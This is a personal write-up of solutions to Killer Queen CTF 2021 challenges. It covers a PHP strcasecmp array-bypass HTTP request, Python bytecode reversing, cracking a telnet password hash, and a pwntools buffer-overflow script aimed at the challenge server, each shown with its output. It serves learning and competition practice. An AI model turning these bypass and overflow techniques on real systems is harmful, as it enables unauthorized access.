# Killer Queen CTF 2021

Completed: Yes
Platform: CTFtime

# Web

## Just Not My Type

```php
<h1>I just don't think we're compatible</h1>

<?php
$FLAG = "shhhh you don't get to see this locally";

if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{
    $password = $_POST["password"];
    if (strcasecmp($password, $FLAG) == 0) 
    {
        echo $FLAG;
    } 
    else 
    {
        echo "That's the wrong password!";
    }
}
?>

<form method="POST">
    Password
    <input type="password" name="password">
    <input type="submit">
</form>
```

The interesting function for us is `strcasecmp`. Found some tricks on HackTricks: [https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#strcmp-strcasecmp](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#strcmp-strcasecmp). Also, official documentation on the function: [https://www.php.net/manual/en/function.strcasecmp.php](https://www.php.net/manual/en/function.strcasecmp.php).

The trick is that if we supply to our variable empty array and not a string, we will be able to bypass this if statement and get the flag. Let's check it!

request:

```
POST / HTTP/1.1
Host: 143.198.184.186:7000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://143.198.184.186:7000
Connection: close
Referer: http://143.198.184.186:7000/
Upgrade-Insecure-Requests: 1

password[]=
```

response:

```
HTTP/1.1 200 OK
Date: Sat, 30 Oct 2021 06:50:29 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
Vary: Accept-Encoding
Content-Length: 391
Connection: close
Content-Type: text/html; charset=UTF-8

<h1>I just don't think we're compatible</h1>

<br />
<b>Warning</b>:  strcasecmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>9</b><br />
flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}
<form method="POST">
    Password
    <input type="password" name="password">
    <input type="submit">
</form>
```

# Reverse

## sneeki snek

```bash
cat sneekisnek.txt   
  4           0 LOAD_CONST               1 ('')
              2 STORE_FAST               0 (f)

  5           4 LOAD_CONST               2 ('rwhxi}eomr\\^`Y')
              6 STORE_FAST               1 (a)

  6           8 LOAD_CONST               3 ('f]XdThbQd^TYL&\x13g')
             10 STORE_FAST               2 (z)

  7          12 LOAD_FAST                1 (a)
             14 LOAD_FAST                2 (z)
             16 BINARY_ADD
             18 STORE_FAST               1 (a)

  8          20 LOAD_GLOBAL              0 (enumerate)
             22 LOAD_FAST                1 (a)
             24 CALL_FUNCTION            1
             26 GET_ITER
        >>   28 FOR_ITER                48 (to 78)
             30 UNPACK_SEQUENCE          2
             32 STORE_FAST               3 (i)
             34 STORE_FAST               4 (b)

  9          36 LOAD_GLOBAL              1 (ord)
             38 LOAD_FAST                4 (b)
             40 CALL_FUNCTION            1
             42 STORE_FAST               5 (c)

 10          44 LOAD_FAST                5 (c)
             46 LOAD_CONST               4 (7)
             48 BINARY_SUBTRACT
             50 STORE_FAST               5 (c)

 11          52 LOAD_FAST                5 (c)
             54 LOAD_FAST                3 (i)
             56 BINARY_ADD
             58 STORE_FAST               5 (c)

 12          60 LOAD_GLOBAL              2 (chr)
             62 LOAD_FAST                5 (c)
             64 CALL_FUNCTION            1
             66 STORE_FAST               5 (c)

 13          68 LOAD_FAST                0 (f)
             70 LOAD_FAST                5 (c)
             72 INPLACE_ADD
             74 STORE_FAST               0 (f)
             76 JUMP_ABSOLUTE           28

 14     >>   78 LOAD_GLOBAL              3 (print)
             80 LOAD_FAST                0 (f)
             82 CALL_FUNCTION            1
             84 POP_TOP
             86 LOAD_CONST               0 (None)
             88 RETURN_VALUE
```

It's a python bytecode. So, I just rewrote it in python with this documentation: [https://docs.python.org/3/library/dis.html](https://docs.python.org/3/library/dis.html).

```python
#!/usr/bin/env python3

# 4
f = ''

# 5
a = 'rwhxi}eomr\\^`Y'

# 6
z = 'f]XdThbQd^TYL&\x13g'

# 7
a += z

# 8
for i, b in enumerate(a):
    # 9
    c = ord(b)

    # 10
    c -= 7

    # 11
    c += i

    # 12
    c = chr(c)

    # 13
    f += c

# 14
print(f)
```

Got the flag:

```bash
python3 sneekisnek.py
kqctf{dont_be_mean_to_snek_:(}
```

## sneeki snek 2 oh no what did i do

Again just translate the bytecode to python code:

```python
#!/usr/bin/env python3

# 4
a = []

# 5
a.append(1739411)

# 6
a.append(1762811)

# 7
a.append(1794011)

# 8
a.append(1039911)

# 9
a.append(1061211)

# 10
a.append(1718321)

# 11
a.append(1773911)

# 12
a.append(1006611)

# 13
a.append(1516111)

# 14
a.append(1739411)

# 15
a.append(1582801)

# 16
a.append(1506121)

# 17
a.append(1783901)

# 18
a.append(1783901)

# 19
a.append(1773911)

# 20
a.append(1582801)

# 21
a.append(1006611)

# 22
a.append(1561711)

# 23
a.append(1039911)

# 24
a.append(1582801)

# 25
a.append(1773911)

# 26
a.append(1561711)

# 27
a.append(1582801)

# 28
a.append(1773911)

# 29
a.append(1006611)

# 30
a.append(1516111)

# 31
a.append(1516111)

# 32
a.append(1739411)

# 33
a.append(1728311)

# 34
a.append(1539421)

# 36
b = ''

# 37
for i in a:
    # 38
    c = str(i)[::-1]

    # 39
    c = c[:-1]

    # 40
    c = int(c)

    # 41
    c = c ^ 5

    # 42
    c = c - 55555

    # 43
    c = c // 555

    # 44
    b += chr(c)
# 45
print(b)
```

Flag:

```bash
python3 sneekisnek2.py   
kqctf{snek_waas_not_so_sneeki}
```

## jazz

Decompile the jar file with [http://java-decompiler.github.io/](http://java-decompiler.github.io/).

# Forensics

## Obligatory Shark

Telnet clear text:

```
........... ..!.."..'........ ..#..'..#........!.."..... .....'.............d.%.... .38400,38400....'.......linux...........Ubuntu 20.04.3 LTS
...thecompany login: uusseerr22
.
Password: 33a465747cb15e84a26564f57cda0988
.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 29 Oct 2021 02:41:16 AM UTC

  System load:  0.03              Processes:              202
  Usage of /:   51.1% of 4.86GB   Users logged in:        0
  Memory usage: 22%               IPv4 address for ens33: 192.168.255.5
  Swap usage:   0%

0 updates can be applied immediately.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user2@thecompany:~$
```

Cracked the hash `33a465747cb15e84a26564f57cda0988` with crackstation ([https://crackstation.net/](https://crackstation.net/))  - `dancingqueen`. The flag is `kqctf{dancingqueen}`.

# pwn

from IDA Pro:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[44]; // [rsp+10h] [rbp-30h] BYREF
  unsigned int v5; // [rsp+3Ch] [rbp-4h]

  v5 = 0;
  puts("Is this a kind of magic? What is your magic?: ");
  fflush(_bss_start);
  fgets(s, 64, stdin);
  printf("You entered %s\n", s);
  printf("Your magic is: %d\n", v5);
  fflush(_bss_start);
  if ( v5 == 1337 )
  {
    puts("Whoa we got a magic man here!");
    fflush(_bss_start);
    system("cat flag.txt");
  }
  else
  {
    puts("You need to challenge the doors of time");
    fflush(_bss_start);
  }
  return 0;
}
```

We can see a simple buffer overflow that allows us to change the v5 variable and get the flag. Wrote a script with pwntools:

```python
from pwn import *

r = remote('143.198.184.186', 5000)
print(r.recv())
offset = b"A"*44
offset += p64(1337)
r.send(offset)
r.interactive()
```

Output:

```python
python3 get_flag.py
[+] Opening connection to 143.198.184.186 on port 5000: Done
b'Is this a kind of magic? What is your magic?: \n'
[*] Switching to interactive mode
$ w
You entered AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9\x05Your magic is: 1337
flag{i_hope_its_still_cool_to_use_1337_for_no_reason}
Whoa we got a magic man here!
[*] Got EOF while reading in interactive
```